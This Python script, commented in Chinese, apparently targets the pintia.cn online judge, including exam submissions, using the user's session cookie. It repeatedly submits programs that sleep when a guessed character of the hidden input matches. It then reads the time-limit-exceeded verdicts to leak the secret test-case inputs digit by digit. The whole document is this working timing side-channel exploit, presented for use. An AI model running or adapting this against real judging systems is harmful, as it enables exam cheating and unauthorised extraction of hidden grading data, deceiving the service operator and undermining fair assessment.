import sys
import json
import time
import requests

def get_json(url,post,cookie):
    header={'Host':'pintia.cn','Cookie':cookie,'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36','Content-Type':'application/json;charset=UTF-8','Accept':'application/json;charset=UTF-8'}
    r1=requests.post(url,data=post,headers=header) #提交答案拿到submissionId
    while True:
        r2=requests.get('https://pintia.cn/api/submissions/'+r1.json()['submissionId'],headers=header) #通过submissionId获取测试结果
        if r2.json()['submission']['judgeResponseContents']!=[]: #成功获取到结果，有时需要等待
            break
        time.sleep(2)
    return r2.json()

url='https://pintia.cn'+input('URL:') #/api/exams/1552620996363530240/submissions
post=input('POST:')
cookie=input('Cookie:').replace(' ','')
result=[]
payload="import time\nif ord(input()[!])==#:\n    time.sleep(1)" #本题延迟一秒即可

i=0
while True:
    for ascii_ in list(range(48,58)): #可能出现的字符ascii列表，这个范围是数字的
        post_=post.replace('@',payload.replace('!',str(i)).replace('#',str(ascii_))) #设置payload
        json_=get_json(url,post_,cookie) #获取测试结果
        max=len(json_['publicCases']) #测试用例总数
        while len(result)<max: #将最终结果初始化为空
            result+=['']
        tmp=0
        for j in list(range(max)): #判断每个用例的情况
            if json_['submission']['judgeResponseContents'][0]['programmingJudgeResponseContent']['testcaseJudgeResults'][str(j)]['result']=='TIME_LIMIT_EXCEEDED':
                result[j]+=chr(ascii_) #字母正确
            if json_['submission']['judgeResponseContents'][0]['programmingJudgeResponseContent']['testcaseJudgeResults'][str(j)]['result']=='NON_ZERO_EXIT_CODE':
                tmp+=1
        if tmp==max: #每一个用例结果都超长
            sys.exit()
        print(result)
    i+=1